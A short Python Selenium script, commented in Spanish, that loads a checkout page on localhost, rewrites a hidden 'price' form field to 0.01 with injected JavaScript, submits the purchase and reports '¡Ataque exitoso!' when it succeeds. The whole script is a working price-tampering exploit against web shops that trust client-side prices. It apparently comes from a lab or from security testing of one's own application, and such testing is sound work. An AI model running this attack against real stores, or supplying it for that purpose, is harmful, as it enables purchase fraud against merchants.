from selenium import webdriver
from selenium.webdriver.common.by import By
import time

# Configuración
driver = webdriver.Chrome()
target_url = "http://localhost:3000/checkout"

try:
    driver.get(target_url)
    time.sleep(2)
    
    # Encontrar y modificar campo oculto
    hidden_field = driver.find_element(By.XPATH, "//input[@type='hidden' and @name='price']")
    original_value = hidden_field.get_attribute("value")
    print(f"Valor original: {original_value}")
    
    # Modificar valor usando JavaScript
    driver.execute_script("arguments[0].value = '0.01';", hidden_field)
    print("Valor modificado a 0.01")
    
    # Enviar formulario
    driver.find_element(By.ID, "complete-purchase").click()
    time.sleep(3)
    
    # Verificar resultado
    if "success" in driver.page_source:
        print("¡Ataque exitoso! Compra realizada con precio manipulado")
    
finally:
    driver.quit()